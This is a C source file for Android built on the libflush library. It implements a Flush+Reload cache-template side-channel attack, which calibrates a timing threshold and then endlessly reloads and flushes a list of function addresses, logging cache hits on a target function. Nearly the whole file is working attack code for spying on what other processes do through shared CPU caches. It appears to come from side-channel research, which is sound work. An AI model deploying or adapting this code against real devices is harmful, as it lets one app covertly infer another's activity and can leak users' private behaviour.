/* See LICENSE file for license and copyright information */

#define _GNU_SOURCE

#include <stdio.h>
#include <stdbool.h>
#include <stdlib.h>
#include <getopt.h>
#include <inttypes.h>
#include <sched.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <android/log.h>
#include <libflush/libflush.h>

#include "configuration.h"
#include "lock.h"
#include "libflush.h"

#ifdef WITH_THREADS
#include <pthread.h>
#include "threads.h"
#else
#ifndef WITH_ANDROID
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#else
#include <linux/ashmem.h>
#endif

#include <android/log.h>


static int shared_data_shm_fd = 0;
#endif

#include "logoutput.h"
#include "calibrate.h"
#define BIND_TO_CPU 0

#define LENGTH(x) (sizeof(x)/sizeof((x)[0]))

/* Forward declarations */
static void attack_slave(libflush_session_t* libflush_session, 
                         size_t threshold, size_t number_of_tests, 
                         size_t* addr, size_t length, size_t target, size_t* continueRun);

//size_t *addr;
//size_t length;
size_t flag=0;

int hit(int cpu, size_t number_of_forks, size_t* addr, size_t length, size_t target,size_t* continueRun)
//addr: func list
//length: the length of func list
//number_of_forks: 1
//the address of target function
{
    LOGD("Start.\n");
    size_t threshold = 0; 
    //length = length_;
    //addr = malloc(sizeof(size_t)*length);
    //memcpy(addr,addr_,sizeof(size_t)*length);
    //for(int i=0;i<length;i++)
    //  LOGD("address:%p",addr[i]);
    useconds_t offset_update_time = OFFSET_UPDATE_TIME;
    size_t number_of_tests = NUMBER_OF_TESTS;
    FILE* logfile = NULL;
    /* Initialize libflush */
    libflush_session_t* libflush_session;
    libflush_init(&libflush_session, NULL);
    LOGD("Initialize successfully.\n");
    /* Start calibration */
    if (threshold == 0) {
        //fprintf(stdout, "[x] Start calibration... "); 
	threshold = calibrate(libflush_session,addr[0]); //get the threshold 
	threshold = 180; //sometimes you need to determined by yourself
        LOGD("[x] calibration... %zu\n", threshold);
    }

    /* Start cache template attack */
    LOGD("[x] Target: %zx\n", addr[length-1]);
    LOGD("[x] Threshold: %zu\n", threshold);
    LOGD("[x] Number of forks: %zu\n",number_of_forks);

    /* Bind to CPU */
    size_t number_of_cpus = sysconf(_SC_NPROCESSORS_ONLN);
    LOGD("[x] number of cpu: %zu\n", number_of_cpus);

    /* Start slaves */
    attack_slave(libflush_session, 
        threshold, number_of_tests, 
        addr,length,target,continueRun);
    /* Terminate libflush */
    libflush_terminate(libflush_session);
    return 0;
}

static void
attack_slave(libflush_session_t* libflush_session, size_t threshold,
             size_t number_of_tests, size_t* addr, size_t length, size_t target,size_t* continueRun)
{
    libflush_init(&libflush_session, NULL);//initialize twice
    LOGD("[x] attack slave ");
    size_t number_to_pause = 0;
    /* Run Flush and reload */
    uint64_t start = libflush_get_timing(libflush_session);
    while(true){
      for(int crt_ofs=0; crt_ofs<length; crt_ofs=crt_ofs+1){//Traverse all addresses
        //LOGD("time consumed %d",libflush_get_timing(libflush_session)-start);
        //start = libflush_get_timing(libflush_session);
	number_to_pause++;
        uint64_t count = libflush_reload_address_and_flush(libflush_session, addr[crt_ofs]);  //load the address into cache to count the time, and then flush out
        //if access time < threshold, and addr==target function
        if (count < threshold&&addr[crt_ofs]==target)
        {
          LOGD("cache hit %p", (void*) (addr[crt_ofs]));
        }
      }
      while(*continueRun<=0){ //pause
	sleep(1);
      }
      usleep(50);//sleep to reduce cpu usage
   }
}
